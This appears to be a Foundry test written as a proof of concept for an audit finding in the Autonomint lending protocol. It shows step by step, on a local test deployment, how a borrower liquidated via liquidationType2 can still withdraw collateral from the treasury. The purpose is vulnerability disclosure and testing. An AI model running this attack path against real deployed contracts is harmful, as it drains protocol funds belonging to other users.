// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {console} from "forge-std/Test.sol";
import {AutonomintBase} from "./AutonomintBase.sol";
import {IBorrowing} from "../src/interface/IBorrowing.sol";
import {IOptions} from "../src/interface/IOptions.sol";
import {ITreasury} from "../src/interface/ITreasury.sol";
import {IGlobalVariables} from "../src/interface/IGlobalVariables.sol";
import {MessagingFee} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/OApp.sol";
import {OptionsBuilder} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/libs/OptionsBuilder.sol";

/// H-10 (45463): A user liquidated via liquidationType2 can still withdraw their
/// collateral because borrowLiquidation.liquidationType2 never sets
/// depositDetail.liquidated = true (unlike liquidationType1).
contract Exploit45463 is AutonomintBase {
    using OptionsBuilder for bytes;

    address USER = makeAddr("borrower");
    uint64 constant ETH_PRICE = 1000e2;
    uint256 constant ETH_AMOUNT = 1 ether;
    uint256 constant ETH_VOLATILITY = 50622665;

    function setUp() public {
        _deployAll();
        vm.deal(USER, 1000 ether);
        vm.deal(owner, 1000 ether);
    }

    function _fee(uint32 chain, IGlobalVariables.FunctionToDo f, uint128 gas) internal view returns (uint256) {
        bytes memory options = OptionsBuilder.newOptions().addExecutorLzReceiveOption(gas, 0);
        MessagingFee memory fe = (chain == eidA ? A.global : B.global).quote(f, IBorrowing.AssetName.DUMMY, options, false);
        return fe.nativeFee;
    }

    function testType2LiquidatedUserStillWithdrawsCollateral() public {
        // 1. CDS liquidity on chain A
        vm.startPrank(USER);
        A.usdt.mint(USER, 5_000_000_000);
        A.usdt.approve(address(A.cds), 5_000_000_000);
        A.cds.deposit{value: _fee(eidA, IGlobalVariables.FunctionToDo.UPDATE_GLOBAL, 400000)}(
            uint128(5_000_000_000), 0, true, uint128(5_000_000_000), ETH_PRICE
        );

        // 2. Borrow 1 ETH at price 1000 on chain B
        B.borrow.depositTokens{value: ETH_AMOUNT + _fee(eidB, IGlobalVariables.FunctionToDo.UPDATE_GLOBAL, 400000)}(
            ETH_PRICE,
            uint64(block.timestamp),
            IBorrowing.BorrowDepositParams(IOptions.StrikePrice.TEN, 110000, ETH_VOLATILITY, IBorrowing.AssetName.ETH, ETH_AMOUNT)
        );
        vm.stopPrank();

        uint256 treasuryEthBefore = address(B.treasury).balance;
        console.log("Treasury ETH after borrow:", treasuryEthBefore);

        // 3. ETH crashes ~99% (from $1000 to $10, i.e. currentEthPrice=1000 in the
        //    protocol's 2-decimal scale) -> position is deeply liquidatable
        //    (ratio = 1000*10000/100000 = 100 <= 8000).

        // 4. Admin liquidates USER via TYPE TWO (opens the Synthetix short hedge).
        vm.startPrank(owner);
        uint256 liqFee = _fee(eidB, IGlobalVariables.FunctionToDo(2), 400000);
        B.borrow.liquidate{value: 1 ether + liqFee}(USER, 1, 1000, IBorrowing.LiquidationType.TWO);
        vm.stopPrank();

        // The bug: liquidated flag was NOT persisted by liquidationType2
        ITreasury.GetBorrowingResult memory gb = B.treasury.getBorrowing(USER, 1);
        assertFalse(gb.depositDetails.liquidated, "type2 liquidation must (buggily) leave liquidated=false");
        console.log("liquidated flag after type2:", gb.depositDetails.liquidated);

        // 5. ETH price recovers to $1000 (oracle already at 1000e18) so the
        //    borrower's position is healthy again for withdrawal.

        // 6. USER withdraws their collateral even though they were liquidated.
        //    Top up USDa to repay the debt (as the finding's attack path allows).
        vm.startPrank(owner);
        B.usda.mint(USER, 1_000_000_000);
        vm.stopPrank();

        uint256 userEthBefore = USER.balance;
        vm.startPrank(USER);
        B.usda.approve(address(B.borrow), B.usda.balanceOf(USER));
        uint256 wFee = _fee(eidB, IGlobalVariables.FunctionToDo(1), 350000) + _fee(eidB, IGlobalVariables.FunctionToDo(1), 400000);
        B.borrow.withDraw{value: wFee}(USER, 1, "0x", "0x", ETH_PRICE, uint64(block.timestamp));
        vm.stopPrank();

        uint256 userEthAfter = USER.balance;
        console.log("USER ETH before withdraw:", userEthBefore);
        console.log("USER ETH after  withdraw:", userEthAfter);
        console.log("Treasury ETH after withdraw:", address(B.treasury).balance);

        // HARM: a liquidated borrower reclaimed collateral from the treasury.
        assertGt(userEthAfter, userEthBefore, "liquidated user must NOT have been able to withdraw collateral");
    }
}
